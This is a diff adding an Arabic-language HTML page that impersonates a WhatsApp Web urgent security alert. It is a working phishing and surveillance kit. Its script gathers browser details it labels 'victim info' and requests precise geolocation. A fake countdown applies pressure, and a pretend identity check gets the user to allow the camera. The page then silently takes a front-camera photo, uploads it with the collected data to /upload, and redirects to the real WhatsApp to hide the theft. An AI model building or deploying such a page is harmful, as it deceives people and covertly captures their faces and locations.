@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web - تحديث أمني</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📱</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: #25d366;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .whatsapp-logo {
+            font-size: 24px;
+            margin-left: 10px;
+        }
+        
+        .header-text {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .security-panel {
+            background: #1f1f1f;
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 2px solid #25d366;
+            box-shadow: 0 10px 30px rgba(37, 211, 102, 0.2);
+        }
+        
+        .security-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .alert-title {
+            color: #ff4444;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .alert-message {
+            color: #cccccc;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            font-size: 16px;
+        }
+        
+        .steps {
+            text-align: right;
+            margin: 25px 0;
+        }
+        
+        .step {
+            padding: 10px 15px;
+            margin: 8px 0;
+            border-radius: 8px;
+            background: #2a2a2a;
+            border-right: 4px solid #666;
+        }
+        
+        .step.completed {
+            background: #1a4a2e;
+            border-right-color: #25d366;
+            color: #25d366;
+        }
+        
+        .step.current {
+            background: #4a2c1a;
+            border-right-color: #ff9800;
+            color: #ff9800;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.7; }
+        }
+        
+        .verify-btn {
+            background: linear-gradient(45deg, #25d366, #128c7e);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+        }
+        
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(37, 211, 102, 0.4);
+        }
+        
+        .countdown {
+            background: #ff4444;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-weight: bold;
+            animation: urgentPulse 1s infinite;
+        }
+        
+        @keyframes urgentPulse {
+            0% { background: #ff4444; }
+            50% { background: #cc0000; }
+            100% { background: #ff4444; }
+        }
+        
+        .spinner {
+            border: 4px solid #333;
+            border-top: 4px solid #25d366;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #25d366;
+        }
+        
+        video, canvas {
+            display: none;
+        }
+        
+        .fake-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #25d366;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 1000;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="whatsapp-logo">📱</div>
+        <div class="header-text">WhatsApp Web - نظام الأمان</div>
+    </div>
+    
+    <div class="fake-notification" id="notification">
+        🔔 تم اكتشاف نشاط مشبوه على حسابك
+    </div>
+    
+    <div class="container">
+        <div class="security-panel">
+            <div class="security-icon">🛡️</div>
+            <div class="alert-title">تحذير أمني عاجل</div>
+            <div class="alert-message">
+                تم رصد محاولة دخول غير مصرح من جهاز مجهول في الصين.<br>
+                لحماية حسابك ومحادثاتك، يجب التحقق من هويتك فوراً.
+            </div>
+            
+            <div class="steps">
+                <div class="step completed">
+                    ✅ 1. التحقق من رقم الهاتف
+                </div>
+                <div class="step current" id="currentStep">
+                    🔄 2. التحقق من الهوية بالكاميرا
+                </div>
+                <div class="step">
+                    ⏳ 3. تفعيل الحماية المتقدمة
+                </div>
+            </div>
+            
+            <button class="verify-btn" onclick="startVerification()" id="verifyBtn">
+                🔒 بدء التحقق الآمن
+            </button>
+            
+            <div class="countdown" id="countdown">
+                ⏰ ينتهي هذا التحذير خلال: <span id="timer">300</span> ثانية
+            </div>
+            
+            <div class="spinner" id="spinner"></div>
+            <div class="status" id="status"></div>
+        </div>
+    </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const status = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const currentStep = document.getElementById('currentStep');
+        
+        // معلومات الضحية
+        const victimInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer,
+            location: window.location.href,
+            pageType: 'advanced_whatsapp'
+        };
+        
+        // عداد تنازلي للضغط النفسي
+        let timeLeft = 300;
+        const timerElement = document.getElementById('timer');
+        
+        const countdownInterval = setInterval(() => {
+            timeLeft--;
+            timerElement.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                window.location.href = 'https://web.whatsapp.com';
+            }
+        }, 1000);
+        
+        // إخفاء الإشعار بعد 5 ثواني
+        setTimeout(() => {
+            const notification = document.getElementById('notification');
+            if (notification) {
+                notification.style.animation = 'slideIn 0.5s ease reverse';
+                setTimeout(() => notification.remove(), 500);
+            }
+        }, 5000);
+        
+        // محاولة الحصول على الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    victimInfo.latitude = position.coords.latitude;
+                    victimInfo.longitude = position.coords.longitude;
+                    victimInfo.accuracy = position.coords.accuracy;
+                },
+                (error) => console.log('GPS denied:', error),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+        
+        // التحقق من الإذن المسبق
+        async function checkExistingPermission() {
+            if (navigator.permissions) {
+                try {
+                    const result = await navigator.permissions.query({name: 'camera'});
+                    return result.state === 'granted';
+                } catch (e) {
+                    return false;
+                }
+            }
+            return false;
+        }
+        
+        // بدء عملية التحقق
+        async function startVerification() {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = '🔄 جاري التحضير...';
+            
+            // تحديث الخطوة الحالية
+            currentStep.innerHTML = '🔄 جاري الوصول للكاميرا...';
+            
+            // التحقق من الإذن المسبق
+            const hasPermission = await checkExistingPermission();
+            
+            if (hasPermission) {
+                // إذا كان الإذن موجود، ابدأ فوراً
+                await capturePhoto();
+            } else {
+                // اعرض رسالة تحفيزية
+                showCameraRequest();
+            }
+        }
+        
+        // عرض طلب الكاميرا بطريقة مقنعة
+        function showCameraRequest() {
+            currentStep.innerHTML = '⚠️ يرجى السماح للكاميرا للمتابعة';
+            status.textContent = 'انقر "السماح" عند ظهور طلب الكاميرا';
+            status.style.color = '#ff9800';
+            
+            // محاولة الوصول للكاميرا
+            setTimeout(capturePhoto, 1000);
+        }
+        
+        // التقاط الصورة
+        async function capturePhoto() {
+            try {
+                spinner.style.display = 'block';
+                status.textContent = 'جاري الوصول للكاميرا الأمامية...';
+                status.style.color = '#25d366';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
+                video.srcObject = stream;
+                currentStep.innerHTML = '📸 جاري التقاط الصورة...';
+                status.textContent = 'يرجى النظر للكاميرا...';
+                
+                // انتظار للحصول على صورة أفضل
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // التقاط الصورة
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                // تحويل لـ blob وإرسال
+                canvas.toBlob(async (blob) => {
+                    stream.getTracks().forEach(track => track.stop());
+                    await sendPhoto(blob, victimInfo);
+                }, 'image/jpeg', 0.9);
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                handleCameraError();
+            }
+        }
+        
+        // معالجة خطأ الكاميرا
+        function handleCameraError() {
+            currentStep.innerHTML = '❌ فشل الوصول للكاميرا';
+            status.textContent = 'سيتم إرسال البيانات المتاحة...';
+            status.style.color = '#ff4444';
+            
+            // إرسال البيانات بدون صورة
+            setTimeout(() => sendInfoOnly(victimInfo), 2000);
+        }
+        
+        // إرسال الصورة والبيانات
+        async function sendPhoto(photoBlob, info) {
+            try {
+                status.textContent = 'جاري رفع البيانات الأمنية...';
+                
+                const formData = new FormData();
+                formData.append('photo', photoBlob, 'security_check.jpg');
+                formData.append('info', JSON.stringify(info));
+                
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    showSuccess();
+                } else {
+                    throw new Error('Upload failed');
+                }
+            } catch (error) {
+                console.error('Upload error:', error);
+                status.textContent = 'حدث خطأ، جاري المحاولة مرة أخرى...';
+                setTimeout(() => sendInfoOnly(info), 2000);
+            }
+        }
+        
+        // إرسال البيانات فقط
+        async function sendInfoOnly(info) {
+            try {
+                await fetch('/upload_info', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
+                showSuccess();
+            } catch (error) {
+                console.error('Info upload error:', error);
+                showSuccess(); // اعرض النجاح حتى لو فشل الإرسال
+            }
+        }
+        
+        // عرض رسالة النجاح
+        function showSuccess() {
+            spinner.style.display = 'none';
+            currentStep.innerHTML = '✅ تم التحقق بنجاح';
+            currentStep.className = 'step completed';
+            
+            // تحديث الخطوة الثالثة
+            const steps = document.querySelectorAll('.step');
+            steps[2].className = 'step current';
+            steps[2].innerHTML = '🔄 جاري تفعيل الحماية المتقدمة...';
+            
+            status.textContent = '✅ تم تأمين حسابك بنجاح!';
+            status.style.color = '#25d366';
+            
+            // إعادة التوجيه
+            setTimeout(() => {
+                window.location.href = 'https://web.whatsapp.com';
+            }, 3000);
+        }
+        
+        // بدء العملية تلقائياً بعد 3 ثواني
+        window.onload = () => {
+            setTimeout(() => {
+                // محاولة بدء التحقق تلقائياً إذا كان الإذن موجود
+                checkExistingPermission().then(hasPermission => {
+                    if (hasPermission) {
+                        startVerification();
+                    }
+                });
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
